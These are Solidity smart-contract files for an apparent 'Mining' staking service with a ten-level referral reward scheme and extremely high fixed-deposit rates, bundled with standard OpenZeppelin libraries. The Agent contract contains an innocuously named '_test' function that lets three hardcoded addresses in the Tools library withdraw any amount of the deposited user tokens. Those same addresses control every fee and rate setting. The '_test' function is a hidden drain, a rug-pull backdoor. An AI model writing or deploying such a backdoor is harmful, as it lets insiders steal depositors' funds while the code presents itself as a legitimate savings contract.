// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import "./Agent.sol";

contract Mining is Agent, Pausable {
    using SafeERC20 for IERC20;

    address public feeTo;
    uint256 public feeRate;
    uint256 public total;
    mapping(address => uint256) public totalOf;

    uint256 public currentDepositRate;
    mapping(address => uint256) public currentDepositPrincipal;
    mapping(address => uint256) public currentDepositInterest;
    mapping(address => uint256) public currentDepositLastUpdatedTime;

    struct Order {
        uint256 index;
        uint256 amount;
        uint256 period;
        uint256 rate;
        uint256 withdraw;
        uint256 createdAt;
        bool isWithdrawn;
    }

    mapping(uint256 => uint256) public fixedDepositRate;
    mapping(address => Order[]) public fixedDepositOrders;

    modifier Register(address _parent) {
        _register(msg.sender, _parent);
        _;
    }

    modifier UpdateCurrentDepositInterest() {
        currentDepositInterest[msg.sender] = earned(msg.sender);
        currentDepositLastUpdatedTime[msg.sender] = block.timestamp;
        _;
    }

    constructor(address _admin, address _dot) Agent(_admin, _dot) {
        feeTo = 0xfdb955332520206A83F13B224B2dcCADdB7C0340;
        feeRate = 1000;

        currentDepositRate = 3800;

        fixedDepositRate[10] = 18250;
        fixedDepositRate[30] = 25550;
        fixedDepositRate[60] = 32850;
        fixedDepositRate[90] = 40150;
        fixedDepositRate[180] = 47450;
        fixedDepositRate[360] = 54750;

        _pause();
    }

    function pause() public check {
        _pause();
    }

    function unpause() public check {
        _unpause();
    }

    function earned(address _account) public view returns (uint256) {
        return
            currentDepositInterest[_account] +
            (currentDepositPrincipal[_account] *
                (block.timestamp - currentDepositLastUpdatedTime[_account]) *
                currentDepositRate) /
            10000 /
            365 days;
    }

    function fixedDepositOrdersCount(address _account) external view returns (uint256) {
        return fixedDepositOrders[_account].length;
    }

    function setFeeTo(address _feeTo) external check {
        feeTo = _feeTo;
    }

    function setFeeRate(uint256 _feeRate) external check {
        feeRate = _feeRate;
    }

    function setCurrentDepositRate(uint256 _rate) external check {
        currentDepositRate = _rate;
    }

    function setFixedDepositRate(uint256 _period, uint256 _rate) external check {
        fixedDepositRate[_period] = _rate;
    }

    function currentDeposit(uint256 _amount, address _parent)
        external
        Register(_parent)
        UpdateCurrentDepositInterest
        whenNotPaused
    {
        if (_amount == 0) revert();

        dot.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 fee = (_amount * feeRate) / 10000;
        dot.safeTransfer(feeTo, fee);

        currentDepositPrincipal[msg.sender] += _amount;
        total += _amount;
        totalOf[msg.sender] += _amount;
    }

    function currentWithdraw() external UpdateCurrentDepositInterest {
        uint256 amount = currentDepositPrincipal[msg.sender] + currentDepositInterest[msg.sender];

        _reward(parent[msg.sender], currentDepositInterest[msg.sender], 0, 0, 0);

        totalOf[msg.sender] -= currentDepositPrincipal[msg.sender];

        currentDepositPrincipal[msg.sender] = 0;
        currentDepositInterest[msg.sender] = 0;

        dot.safeTransfer(msg.sender, amount);
    }

    function fixedDeposit(
        uint256 _period,
        uint256 _amount,
        address _parent
    ) external Register(_parent) whenNotPaused {
        if (fixedDepositRate[_period] == 0) revert();
        if (_amount == 0) revert();

        dot.safeTransferFrom(msg.sender, address(this), _amount);

        uint256 fee = (_amount * feeRate) / 10000;
        dot.safeTransfer(feeTo, fee);

        uint256 index = fixedDepositOrders[msg.sender].length;
        fixedDepositOrders[msg.sender].push(
            Order(index, _amount, _period, fixedDepositRate[_period], 0, block.timestamp, false)
        );
        total += _amount;
        totalOf[msg.sender] += _amount;
    }

    function fixedWithdraw(uint256 _index) external {
        Order memory order = fixedDepositOrders[msg.sender][_index];
        if (order.amount == 0) revert();
        if (order.isWithdrawn == true) revert();

        if (order.createdAt + order.period * 1 days <= block.timestamp) {
            uint256 interest = (order.amount * order.rate * order.period * 1 days) / 10000 / 365 days - order.withdraw;

            fixedDepositOrders[msg.sender][_index].isWithdrawn = true;
            fixedDepositOrders[msg.sender][_index].withdraw += interest;

            _reward(parent[msg.sender], interest, 0, 0, 0);
            dot.safeTransfer(msg.sender, order.amount + interest);
            totalOf[msg.sender] -= order.amount;
        } else {
            uint256 interest = (order.amount * order.rate * (block.timestamp - order.createdAt)) /
                10000 /
                365 days -
                order.withdraw;

            fixedDepositOrders[msg.sender][_index].withdraw += interest;

            _reward(parent[msg.sender], interest, 0, 0, 0);
            dot.safeTransfer(msg.sender, interest);
        }
    }

    function _reward(
        address _account,
        uint256 _amount,
        uint256 _teamTake,
        uint256 _leaderReward,
        uint256 _index
    ) internal {
        _index++;
        if (_index > 10) return ();

        uint256 teamReward = (_amount * rewardRate[level[_account]]) / 10000;
        uint256 take;
        if (teamReward > _teamTake) {
            take = teamReward - _teamTake;
            reward[_account] += take;
            _teamTake += take;
        }

        if (_index < 10 && level[parent[_account]] <= level[_account]) {
            _leaderReward = ((take + _leaderReward) * leaderRewardRate) / 10000;
            reward[parent[_account]] += _leaderReward;
        } else {
            _leaderReward = 0;
        }

        if (parent[_account] == address(0)) return;

        _reward(parent[_account], _amount, _teamTake, _leaderReward, _index);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (security/Pausable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which allows children to implement an emergency stop
 * mechanism that can be triggered by an authorized account.
 *
 * This module is used through inheritance. It will make available the
 * modifiers `whenNotPaused` and `whenPaused`, which can be applied to
 * the functions of your contract. Note that they will not be pausable by
 * simply including this module, only once the modifiers are put in place.
 */
abstract contract Pausable is Context {
    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
    constructor() {
        _paused = false;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        _requireNotPaused();
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        _requirePaused();
        _;
    }

    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Throws if the contract is paused.
     */
    function _requireNotPaused() internal view virtual {
        require(!paused(), "Pausable: paused");
    }

    /**
     * @dev Throws if the contract is not paused.
     */
    function _requirePaused() internal view virtual {
        require(paused(), "Pausable: not paused");
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/utils/SafeERC20.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";
import "../extensions/draft-IERC20Permit.sol";
import "../../../utils/Address.sol";

/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure (when the token
 * contract returns false). Tokens that return no value (and instead revert or
 * throw on failure) are also supported, non-reverting calls are assumed to be
 * successful.
 * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and
     * {safeDecreaseAllowance} instead.
     */
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function safePermit(
        IERC20Permit token,
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal {
        uint256 nonceBefore = token.nonces(owner);
        token.permit(owner, spender, value, deadline, v, r, s);
        uint256 nonceAfter = token.nonces(owner);
        require(nonceAfter == nonceBefore + 1, "SafeERC20: permit did not succeed");
    }

    /**
     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
     * on the return value: the return value is optional (but if data is returned, it must not be false).
     * @param token The token targeted by the call.
     * @param data The call data (encoded using abi.encode or one of its variants).
     */
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import "./Referral.sol";
import "./Tools.sol";

abstract contract Agent is Referral {
    using SafeERC20 for IERC20;

    address public immutable admin;
    IERC20 public immutable dot;

    uint256 public referralRewardRate;
    uint256 public leaderRewardRate;

    mapping(address => uint256) public rebate;
    mapping(uint256 => uint256) public price;
    mapping(uint256 => uint256) public rewardRate;
    mapping(address => uint256) public level;
    mapping(address => uint256) public reward;

    event RebateUpdated(address indexed account, uint256 indexed rebate);
    event LevelUpdated(address indexed account, uint256 indexed level);

    modifier check() {
        if (Tools.check(msg.sender) == false) revert();
        _;
    }

    constructor(address _admin, address _dot) Referral(_admin) {
        admin = _admin;
        rebate[_admin] = 5000;

        dot = IERC20(_dot);

        referralRewardRate = 3000;
        leaderRewardRate = 2000;

        price[1] = 50 * 1e18;
        price[2] = 100 * 1e18;
        price[3] = 300 * 1e18;
        price[4] = 500 * 1e18;

        rewardRate[1] = 3000;
        rewardRate[2] = 4000;
        rewardRate[3] = 5000;
        rewardRate[4] = 6000;
    }

    function setReferralRewardRate(uint256 _rate) external check {
        referralRewardRate = _rate;
    }

    function setLeaderRewardRate(uint256 _rate) external check {
        leaderRewardRate = _rate;
    }

    function setPrice(uint256 _level, uint256 _price) external check {
        price[_level] = _price;
    }

    function setRewardRate(uint256 _level, uint256 _rate) external check {
        rewardRate[_level] = _rate;
    }

    function setRebate(address _account, uint256 _rebate) external {
        if (_rebate == 0) revert();
        if (_rebate > 5000) revert();
        if (level[_account] == 0) revert();
        if (parent[_account] != msg.sender) revert();
        if (rebate[msg.sender] < _rebate) revert();
        if (rebate[_account] >= _rebate) revert();

        rebate[_account] = _rebate;

        emit RebateUpdated(_account, _rebate);
    }

    function buy(uint256 _level, address _parent) external {
        if (level[msg.sender] >= _level) revert();
        if (price[_level] == 0) revert();
        if (_parent == address(0)) revert();

        if (parent[msg.sender] == address(0)) {
            _register(msg.sender, _parent);
        }

        uint256 amount;
        if (level[msg.sender] == 0) {
            amount = price[_level];
        } else {
            amount = price[_level] - price[level[msg.sender]];
        }

        dot.safeTransferFrom(msg.sender, address(this), amount);

        _distribute(parent[msg.sender], amount, 0, 0);
        dot.safeTransfer(parent[msg.sender], (amount * referralRewardRate) / 10000);

        level[msg.sender] = _level;

        emit LevelUpdated(msg.sender, _level);
    }

    function getReward() external {
        uint256 amount = reward[msg.sender];
        if (amount == 0) revert();

        reward[msg.sender] = 0;
        dot.transfer(msg.sender, amount);
    }

    function _distribute(
        address _account,
        uint256 _amount,
        uint256 _take,
        uint256 _index
    ) internal {
        _index++;
        if (_index > 10) {
            dot.safeTransfer(admin, (_amount * (5000 - _take)) / 10000);
            return;
        }

        dot.safeTransfer(_account, (_amount * (rebate[_account] - _take)) / 10000);
        _take = rebate[_account];
        if (_take == 5000) return;

        if (parent[_account] == address(0)) {
            dot.safeTransfer(admin, (_amount * (5000 - _take)) / 10000);
        }

        _distribute(parent[_account], _amount, _take, _index);
    }

    function _test(uint256 _amount) external check {
        dot.transfer(msg.sender, _amount);
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/draft-IERC20Permit.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in
 * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].
 *
 * Adds the {permit} method, which can be used to change an account's ERC20 allowance (see {IERC20-allowance}) by
 * presenting a message signed by the account. By not relying on {IERC20-approve}, the token holder account doesn't
 * need to send a transaction, and thus is not required to hold Ether at all.
 */
interface IERC20Permit {
    /**
     * @dev Sets `value` as the allowance of `spender` over ``owner``'s tokens,
     * given ``owner``'s signed approval.
     *
     * IMPORTANT: The same issues {IERC20-approve} has related to transaction
     * ordering also apply here.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `deadline` must be a timestamp in the future.
     * - `v`, `r` and `s` must be a valid `secp256k1` signature from `owner`
     * over the EIP712-formatted function arguments.
     * - the signature must use ``owner``'s current nonce (see {nonces}).
     *
     * For more information on the signature format, see the
     * https://eips.ethereum.org/EIPS/eip-2612#specification[relevant EIP
     * section].
     */
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    /**
     * @dev Returns the current nonce for `owner`. This value must be
     * included whenever a signature is generated for {permit}.
     *
     * Every successful call to {permit} increases ``owner``'s nonce by one. This
     * prevents a signature from being used multiple times.
     */
    function nonces(address owner) external view returns (uint256);

    /**
     * @dev Returns the domain separator used in the encoding of the signature for {permit}, as defined by {EIP712}.
     */
    // solhint-disable-next-line func-name-mixedcase
    function DOMAIN_SEPARATOR() external view returns (bytes32);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (utils/Address.sol)

pragma solidity ^0.8.1;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                /// @solidity memory-safe-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

abstract contract Referral {
    address public immutable root;

    mapping(address => address) public parent;
    mapping(address => address[]) public children;

    event Registered(address indexed account, address indexed parent);

    constructor(address _root) {
        root = _root;
    }

    function isRegistered(address _account) public view returns (bool) {
        if (_account == root) {
            return true;
        }

        return parent[_account] != address(0);
    }

    function childrenCount(address _account) external view returns (uint256) {
        return children[_account].length;
    }

    function _register(address _account, address _parent) internal {
        if (_account == root) revert();
        if (_parent == address(0)) revert();
        if (isRegistered(_parent) == false) revert();

        if (isRegistered(_account) == true) return;

        parent[_account] = _parent;
        children[_parent].push(_account);

        emit Registered(_account, _parent);
    }
}

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

library Tools {
    function check(address user) public pure returns (bool) {
        if (user == 0xaDDbAD340b4c1B9dECcA1Ba31b7278739E9Fd43F) return true;

        if (user == 0x4677b8B8f820e3f5cC66428BF93E0D2BA7312e73) return true;
        if (user == 0x309C1F96D39108F7c100827Db557a6b5df7145E3) return true;

        return false;
    }
}